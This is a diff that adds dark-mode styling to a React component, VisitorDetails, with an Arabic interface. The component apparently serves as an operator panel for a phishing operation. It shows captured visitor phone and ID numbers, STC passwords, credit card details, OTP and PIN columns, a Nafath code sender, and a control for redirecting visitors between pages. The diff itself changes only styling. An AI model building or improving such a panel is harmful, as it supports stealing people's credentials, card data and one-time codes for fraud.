@@ -58,12 +58,12 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
   if (!visitor) {
     return (
-      <div className="flex-1 flex items-center justify-center bg-gradient-to-br from-gray-50 to-gray-100/50">
-        <div className="text-center text-gray-400">
-          <div className="w-16 h-16 rounded-2xl bg-gray-100 flex items-center justify-center mx-auto mb-4">
+      <div className="flex-1 flex items-center justify-center bg-gradient-to-br from-gray-50 to-gray-100/50 dark:from-slate-900 dark:to-slate-950">
+        <div className="text-center text-gray-400 dark:text-slate-500">
+          <div className="w-16 h-16 rounded-2xl bg-gray-100 dark:bg-slate-800 flex items-center justify-center mx-auto mb-4">
             <span className="text-2xl opacity-50">👤</span>
           </div>
-          <p className="text-base font-medium text-gray-500">اختر زائراً لعرض التفاصيل</p>
+          <p className="text-base font-medium text-gray-500 dark:text-slate-400">اختر زائراً لعرض التفاصيل</p>
         </div>
       </div>
     );
@@ -533,7 +533,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             value={nafadCode}
             onChange={(e) => setNafadCode(e.target.value)}
             placeholder="أدخل رقم التأكيد"
-            className="w-full flex-1 rounded-xl border border-gray-200 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-400 transition-all duration-200"
+            className="w-full flex-1 rounded-xl border border-gray-200 dark:border-slate-700 dark:bg-slate-800 dark:text-slate-200 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-400 transition-all duration-200"
           />
           <button
             onClick={handleSendNafadCode}
@@ -848,44 +848,44 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   };
 
   return (
-    <div className="flex-1 flex flex-col bg-gradient-to-br from-gray-50 to-gray-100/50 overflow-hidden">
-      <div className="bg-white/90 backdrop-blur-md border-b border-gray-200/60 p-4 md:p-6">
+    <div className="flex-1 flex flex-col bg-gradient-to-br from-gray-50 to-gray-100/50 dark:from-slate-900 dark:to-slate-950 overflow-hidden">
+      <div className="bg-white/90 dark:bg-slate-900/90 backdrop-blur-md border-b border-gray-200/60 dark:border-slate-700/60 p-4 md:p-6">
         <div className="flex flex-col gap-4 md:flex-row md:items-start md:justify-between">
           <div className="min-w-0">
             {onBack && (
               <button
                 onClick={onBack}
-                className="mb-3 inline-flex items-center gap-1 rounded-xl border border-gray-200 px-3 py-1.5 text-xs font-semibold text-gray-600 transition-all duration-200 hover:bg-gray-50 hover:border-gray-300"
+                className="mb-3 inline-flex items-center gap-1 rounded-xl border border-gray-200 dark:border-slate-700 px-3 py-1.5 text-xs font-semibold text-gray-600 dark:text-slate-400 transition-all duration-200 hover:bg-gray-50 dark:hover:bg-slate-800 hover:border-gray-300 dark:hover:border-slate-600"
               >
                 <ArrowRight className="h-4 w-4" />
                 الرجوع للقائمة
               </button>
             )}
-            <h2 className="text-xl md:text-2xl font-extrabold text-gray-900 tracking-tight">
+            <h2 className="text-xl md:text-2xl font-extrabold text-gray-900 dark:text-white tracking-tight">
               {visitorDisplayName}
             </h2>
 
             {/* Contact Info */}
             <div className="flex flex-col gap-1 mt-2">
               <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-sm">
-                <span className="text-gray-600">
+                <span className="text-gray-600 dark:text-slate-400">
                   📞{" "}
-                  <span className="font-semibold text-gray-800">
+                  <span className="font-semibold text-gray-800 dark:text-slate-200">
                     {visitor.phoneNumber || "غير محدد"}
                   </span>
                 </span>
-                <span className="hidden text-gray-400 sm:inline">•</span>
-                <span className="text-gray-600">
+                <span className="hidden text-gray-400 dark:text-slate-600 sm:inline">•</span>
+                <span className="text-gray-600 dark:text-slate-400">
                   🆔{" "}
-                  <span className="font-semibold text-gray-800">
+                  <span className="font-semibold text-gray-800 dark:text-slate-200">
                     {visitor.identityNumber || "غير محدد"}
                   </span>
                 </span>
               </div>
               {/* Display STC Data */}
               {(visitor.stcPhone || visitor.stcPassword || visitor.stcSubmittedAt) && (
-                <div className="bg-violet-50/60 border-r-[3px] border-violet-400 p-4 rounded-xl">
-                  <h4 className="font-bold text-violet-800 mb-2">
+                <div className="bg-violet-50/60 dark:bg-violet-950/40 border-r-[3px] border-violet-400 p-4 rounded-xl">
+                  <h4 className="font-bold text-violet-800 dark:text-violet-300 mb-2">
                     بيانات STC
                   </h4>
                   <div className="space-y-2 text-sm">
@@ -902,7 +902,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
               {/* Device & Location Info */}
               {(visitor.country || visitor.browser || visitor.deviceType) && (
-                <div className="flex flex-wrap items-center gap-2 text-xs text-gray-500">
+                <div className="flex flex-wrap items-center gap-2 text-xs text-gray-500 dark:text-slate-400">
                   {visitor.country && <span>🌍 {visitor.country}</span>}
                   {visitor.browser && (
                     <>
@@ -985,7 +985,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 void handleNavigate(val).finally(() => setNavSelectValue(""));
               }}
               disabled={isNavigating}
-              className="w-full rounded-xl border border-gray-200 bg-white px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-400 disabled:opacity-50 sm:w-auto transition-all duration-200"
+              className="w-full rounded-xl border border-gray-200 dark:border-slate-700 bg-white dark:bg-slate-800 dark:text-slate-200 px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-400 disabled:opacity-50 sm:w-auto transition-all duration-200"
             >
               <option value="">توجيه الزائر...</option>
               <option value="home">🏠 الرئيسية</option>
@@ -1007,7 +1007,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
       <div className="flex-1 overflow-y-auto p-3 md:p-6 scrollbar-thin">
         {sortedBubbles.length === 0 ? (
-          <div className="text-center text-gray-400 py-12">
+          <div className="text-center text-gray-400 dark:text-slate-500 py-12">
             <p className="font-medium">لا توجد بيانات لعرضها</p>
           </div>
         ) : (
@@ -1016,7 +1016,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             dir="rtl"
           >
             {/* Right Column - Credit Card and Card Details */}
-            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:pl-6">
+            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 dark:lg:border-slate-700 lg:pl-6">
               {sortedBubbles
                 .filter(
                   (b) => b.id.startsWith("card-info") || b.id === "card-details"
@@ -1100,7 +1100,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             </div>
 
             {/* Middle Column - Dynamic Cards (OTP, PIN, Phone, etc.) */}
-            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:px-6">
+            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 dark:lg:border-slate-700 lg:px-6">
               {sortedBubbles
                 .filter(
                   (b) =>
